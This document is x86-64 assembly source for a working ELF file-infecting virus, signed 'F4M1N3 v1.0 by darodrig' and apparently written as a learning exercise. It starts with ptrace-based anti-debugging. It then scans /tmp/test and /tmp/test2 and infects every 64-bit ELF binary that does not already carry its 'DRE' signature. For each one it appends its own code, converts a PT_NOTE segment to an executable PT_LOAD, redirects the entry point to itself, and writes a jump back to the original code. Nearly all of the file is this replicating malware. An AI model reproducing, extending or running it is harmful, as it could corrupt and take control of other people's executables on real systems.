; SYSCALLS
%define SYS_EXIT		60
%define SYS_OPEN		2
%define SYS_CLOSE	   3
%define SYS_WRITE	   1
%define SYS_READ		0
%define SYS_EXECVE	  59
%define SYS_GETDENTS64  217
%define SYS_FSTAT	   5
%define SYS_LSEEK	   8
%define SYS_PREAD64		17
%define SYS_PWRITE64	18
%define SYS_SYNC		162
%define SYS_GETUID		102
%define SYS_CHDIR		80
%define SYS_PTRACE		101


%define DT_REG			8
%define SEEK_END		2
%define DIRENT_BUFFSIZE	1024

; PTYPES
%define PT_LOAD			1
%define PT_NOTE			4

; OPEN MODES
%define O_RDONLY		00000000
%define O_WRONLY		00000001
%define O_RDWR		  00000002

%define argv0			[rsp + 8]
%define argc			[rsp + 4]
%define SIGNATURE		0x00455244
%define PF_X	1
%define PF_R	4
%define PF_W	2
; ***  r15 offsets ****
; 0 = stack buffer = stat
; 48 = stat.st_size

; 144 = ehdr
; 148 = ehdr.class
; 152 = ehdr.pad
; 168 = ehdr.entry
; 176 = ehdr.phoff
; 198 = ehdr.phentsize
; 200 = ehdr.phnum

; 208 = phdr = phdr.type
; 212 = phdr.flags
; 216 = phdr.offset
; 224 = phdr.vaddr
; 232 = phdr.paddr
; 240 = phdr.filesz
; 248 = phdr.memsz
; 256 = phdr.align

; 300 = jmp rel

; 350 = directory size

; 400 = dirent = dirent.d_ino
; 416 = dirent.d_reclen
; 418 = dirent.d_type
; 419 = dirent.d_name
; 500 = first folder
section .text
	global _start
_start:
	mov r14, [rsp + 8]										 ; saving argv0 to r14
	push rdx
	push rsp
	sub rsp, 5000											 ; reserving 5000 bytes
	mov r15, rsp
	mov byte [r15 + 550], 0										; 0 for /tmp/test, 1 for /tmp/test2

	mov rax, SYS_PTRACE											; anti-debugging
	xor rdi, rdi
	syscall
	cmp rax, 0
	jl cleanup

	call set_folder_chdir
	chdir:
		pop rdi
		mov rax, SYS_CHDIR
		syscall
	cmp byte [r15 + 550], 0
	je .test1
	jmp set_folder2
.test1:
	call set_folder ;/tmp/test
	dirent:
		pop rdi
		mov rsi, O_RDONLY
		xor rdx, rdx
		mov rax, SYS_OPEN
		syscall

		pop rdi
		cmp rax, 0
		jbe	_end

		mov rdi, rax
		lea rsi, [r15 + 400]
		mov rdx, DIRENT_BUFFSIZE
		mov rax, SYS_GETDENTS64
		syscall   

		cmp rax, 0
		jbe err

		mov qword [r15 + 350], rax
		mov rax, SYS_CLOSE
		syscall
		
		xor rcx, rcx
	
	for_each_file:
		push rcx
		cmp byte [r15 + 418 + rcx], DT_REG					; if its a regular file
		jne .continue
		.open_target_file:
			; call print_dot
			lea rdi, [rcx + r15 + 419]						; dirent.d_name = [r15 + 419]
			mov rsi, O_RDWR
			xor rdx, rdx
			mov rax, SYS_OPEN
			syscall

			cmp rax, 0										; if can't open file, _end now
			jbe .continue
			mov r9, rax
		.read_ehdr:
			mov rdi, r9										; r9 contains fd
			lea rsi, [r15 + 144]							; rsi = ehdr = [r15 + 144]
			mov rdx, 64										; ehdr.size
			mov r10, 0										; read at offset 0
			mov rax, SYS_PREAD64
			syscall
		.is_elf_64:
			cmp dword [r15 + 144], 0x464c457f				; 0x464c457f means .ELF (little-endian)
			jnz .close_file  
			cmp byte [r15 + 148], 0x2						; check if target ELF is 64bit
			jne .close_file
		.is_infected:
			cmp dword [r15 + 152], SIGNATURE				; check signature in [r15 + 152] ehdr.pad (DRE in little-endian, plus trailing zero to fill up a word size)
			jz .close_file   
		mov r8, [r15 + 176]									; r8 now holds ehdr.phoff from [r15 + 176]
		xor rbx, rbx										; initializing phdr loop counter in rbx
		xor r14, r14										; r14 will hold phdr file offset

		.loop_phdr:
			mov rdi, r9										; r9 contains fd
			lea rsi, [r15 + 208]							; rsi = phdr = [r15 + 208]
			mov dx, word [r15 + 198]						; ehdr.phentsize is at [r15 + 198]
			mov r10, r8										; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
			mov rax, SYS_PREAD64
			syscall


			cmp byte [r15 + 208], PT_NOTE					; check if phdr.type in [r15 + 208] is PT_NOTE (4)
			jz .infect										; if yes, bingo, start infecting

			inc rbx											; if not, increase rbx counter
			cmp bx, word [r15 + 200]							; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
			jge .close_file									; _end if no valid phdr for infection was found

			add r8w, word [r15 + 198]						; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w
			jnz .loop_phdr									; read next phdr

		.infect:
			.get_target_phdr_file_offset:
				mov ax, bx									; loading phdr loop counter bx to ax
				mov dx, word [r15 + 198]					; loading ehdr.phentsize from [r15 + 198] to dx
				imul dx										; bx * ehdr.phentsize
				mov r14w, ax
				add r14, [r15 + 176]						; r14 = ehdr.phoff + (bx * ehdr.phentsize)

			.file_info:
				mov rdi, r9
				mov rsi, r15								; rsi = r15 = stack buffer address
				mov rax, SYS_FSTAT
				syscall 
			.append_virus:
				; getting target EOF
				mov rdi, r9									; r9 contains fd
				mov rsi, 0									; seek offset 0
				mov rdx, SEEK_END
				mov rax, SYS_LSEEK
				syscall										; getting target EOF offset in rax
				push rax									; saving target EOF

				call .delta									; the age old trick
				.delta:
					pop rbp
					sub rbp, .delta

				; writing virus body to EOF
				mov rdi, r9									; r9 contains fd
				lea rsi, [rbp + _start]						; loading _start address in rsi
				mov rdx, _end - _start						; virus size
				mov r10, rax								; rax contains target EOF offset from previous syscall
				mov rax, SYS_PWRITE64
				syscall

				cmp rax, 0
				jbe .close_file

			.patch_phdr:
				mov dword [r15 + 208], PT_LOAD				; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
				mov dword [r15 + 212], PF_R | PF_X ;| PF_W	; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4) | PF_W (2)
				pop rax										; restoring target EOF offeset into rax
				mov [r15 + 216], rax						; phdr.offset [r15 + 216] = target EOF offset
				mov r13, [r15 + 48]							; storing target stat.st_size from [r15 + 48] in r13
				add r13, 0xc000000							; adding 0xc000000 to target file size
				mov [r15 + 224], r13						; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)
				mov qword [r15 + 256], 0x200000				; set phdr.align in [r15 + 256] to 2mb
				add qword [r15 + 240], _end - _start + 5	; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
				add qword [r15 + 248], _end - _start + 5	; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry

				mov rdi, r9									; fd
				mov rsi, r15								; rsi = r15 = stack buffer address
				lea rsi, [r15 + 208]						; rsi = phdr = [r15 + 208]
				mov dx, word [r15 + 198]					; ehdr.phentsize from [r15 + 198]
				mov r10, r14								; phdr from [r15 + 208]
				mov rax, SYS_PWRITE64
				syscall

				cmp rax, 0
				jbe .close_file

			.patch_ehdr:
				mov r14, [r15 + 168]						; storing target original ehdr.entry from [r15 + 168] in r14
				mov [r15 + 168], r13						; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)
				mov r13, SIGNATURE							; loading DRE signature
				mov [r15 + 152], r13						; adding the virus signature to ehdr.pad in [r15 + 152]
				mov rdi, r9									; r9 contains fd
				lea rsi, [r15 + 144]						; rsi = ehdr = [r15 + 144]
				mov rdx, 64									; ehdr.size
				mov r10, 0									; ehdr.offset
				mov rax, SYS_PWRITE64
				syscall

				cmp rax, 0
				jbe .close_file

			.write_patched_jmp:
				; getting target new EOF
				mov rdi, r9									; r9 contains fd
				mov rsi, 0									; seek offset 0
				mov rdx, SEEK_END
				mov rax, SYS_LSEEK
				syscall										; getting target EOF offset in rax

				; creating patched jmp
				mov rdx, [r15 + 224]						; rdx = phdr.vaddr
				add rdx, 5
				sub r14, rdx
				sub r14, _end - _start
				mov byte [r15 + 300 ], 0xe9
				mov dword [r15 + 301], r14d

				; writing patched jmp to EOF
				mov rdi, r9									; r9 contains fd
				lea rsi, [r15 + 300]						; rsi = patched jmp in stack buffer = [r15 + 208]
				mov rdx, 5									; size of jmp rel
				mov r10, rax								; mov rax to r10 = new target EOF
				mov rax, SYS_PWRITE64
				syscall
				cmp rax, 0
				jbe .close_file
				mov rax, SYS_SYNC							; commiting filesystem caches to disk
				syscall
		.close_file:
			mov rax, SYS_CLOSE								; close source fd in rdi
			syscall
		.continue:
			pop rcx
			add cx, word [rcx + r15 + 416]
			cmp rcx, qword [r15 + 350]
			jne for_each_file
		cmp byte [r15 + 550], 0
		jne cleanup
		mov byte [r15 + 550], 1
		jmp set_folder_chdir2
set_folder:
	call dirent
	db "/tmp/test", 0
set_folder_chdir:
	call chdir
	db `/tmp/test\0`
set_folder2:
	call dirent
	db `/tmp/test2\0`
set_folder_chdir2:
	call chdir
	db `/tmp/test2\0`
famine:
	db 'F4M1N3 v1.0 by darodrig', 0
err:
	mov rax, SYS_EXIT
	mov rdi, 0xfffffff
	syscall
cleanup:
	add rsp, 5000	   ; restoring stack 
	pop rsp
	pop rdx
_end:
	mov rax, 35 ; nanosleep
	mov rdi, 100000
	xor rdi, rdi
	mov rax, SYS_EXIT
	syscall